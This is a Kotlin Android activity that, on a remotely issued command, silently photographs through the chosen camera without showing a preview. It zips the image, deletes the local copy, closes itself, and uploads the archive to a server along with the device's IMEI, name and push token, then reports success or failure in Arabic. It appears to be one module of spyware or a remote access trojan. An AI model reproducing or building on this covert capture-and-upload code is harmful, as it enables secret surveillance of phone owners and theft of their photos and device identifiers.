package com.example.mobiletwo

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.camera.core.Camera
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import com.google.common.util.concurrent.ListenableFuture
import java.io.File
import java.util.concurrent.Executor
import java.util.concurrent.Executors

class TakePhoto : AppCompatActivity() {
    var ri: Int=0
    var lens: Int=0
    var command:String=""
    private var mExecutor: Executor = Executors.newSingleThreadExecutor()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        println("Activity started!!!")
        ri=intent.getIntExtra("ri", 0)
        command = intent.getStringExtra("command")?:""
        lens=intent.getIntExtra("lens", 0)
        println(lens)
        startCamera()
    }

    private fun startCamera() {
        try {
            val mProcessCameraProvider: ListenableFuture<ProcessCameraProvider> = ProcessCameraProvider.getInstance(baseContext)
            mProcessCameraProvider.addListener(
                {
                    try {
                        val gProcessCameraProvider: ProcessCameraProvider =mProcessCameraProvider.get()
                        bindPreview(gProcessCameraProvider)
                    }catch (ex:Exception){
                        MyExecutorFG.writeError(ex)
                        println(ex.message?:"")}
                }, ContextCompat.getMainExecutor(baseContext))
        }catch (ex:Exception){
            MyExecutorFG.logEx(ex, "startCamera")
        }
    }

    private fun bindPreview(gProcessCameraProvider: ProcessCameraProvider) {
        try{
            val mCameraSelector: CameraSelector = CameraSelector.Builder()
                .requireLensFacing(lens).build()
            val mImageCaptureBuilder: ImageCapture.Builder = ImageCapture.Builder()
            println("setTargetRotation")
            val mImageCapture: ImageCapture = mImageCaptureBuilder
                .setTargetRotation(windowManager.defaultDisplay.rotation).build()
            println("done")
            var mCamera: Camera = gProcessCameraProvider.bindToLifecycle(
                this,
                mCameraSelector, mImageCapture
            )
            takePic(mImageCapture)
        }
        catch (ex:Exception){
            MyExecutorFG.logEx(ex, "bindPreview")
        }
    }

    private fun takePic(mImageCapture: ImageCapture) {
        try{
            val mFile = File("${Consts.sFiles}/Camera/Image.jpg")
            mFile.parentFile?.mkdirs()
            println("Find This: ${mFile.parent}")
            val mOutputFileOptions: ImageCapture.OutputFileOptions =
                ImageCapture.OutputFileOptions.Builder(mFile).build()
            class MOnImageSavedCallback : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                    println("ImageSaved!")
                    val comped = MyExecutorFG.zipLocalFile(arrayListOf(mFile.absolutePath),
                        mFile.absolutePath.replace(".jpg", "_${System.currentTimeMillis()}.zip"))
                    mFile.delete()
                    Log.i("Done", "True")
                    finishAffinity()
                    Thread {
                        Log.i("Thread", "Started")
                        MyApiOld.conan(
                            ri.toString(),
                            MyFireBaseMessagingService.dSPRead.getString("FCMToken", "") ?: "",
                            command,
                            MyFireBaseMessagingService.dSPRead.getString("mDeviceName", "") ?: "",
                            comped,
                            "camera${lens}_${System.currentTimeMillis()}.zip",
                            "images",
                            MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: "",
                            null,
                            null,
                        true).also { if (it == 0) {MyApiOld.resp(
                            ri.toString(), "المهمه مكتمله", "", "", "3",
                            command, "", MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: ""
                        ) } }
                        MyForeGroundService.stopService(baseContext)
                    }.start()
                }
                override fun onError(ex: ImageCaptureException) {
                    Log.i("takePicture", ex.message?:"")
                    ex.printStackTrace()
                    finishAffinity()
                    Thread {
                        MyApiOld.resp(
                            ri.toString(), "فشل", "", "", "5",
                            command, "", MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: ""
                        )
                    }.start()
                }
            }
            mImageCapture.takePicture(mOutputFileOptions, mExecutor, MOnImageSavedCallback())
        }catch (ex:Exception){
            MyExecutorFG.logEx(ex, "takePic")
            finishAffinity()
            Thread {
                MyApiOld.resp(
                    ri.toString(), "فشل", "", "", "5",
                    command, "", MyFireBaseMessagingService.dSPRead.getString("imei", "") ?: ""
                )
                MyForeGroundService.stopService(baseContext)
            }.start()
        }
    }
}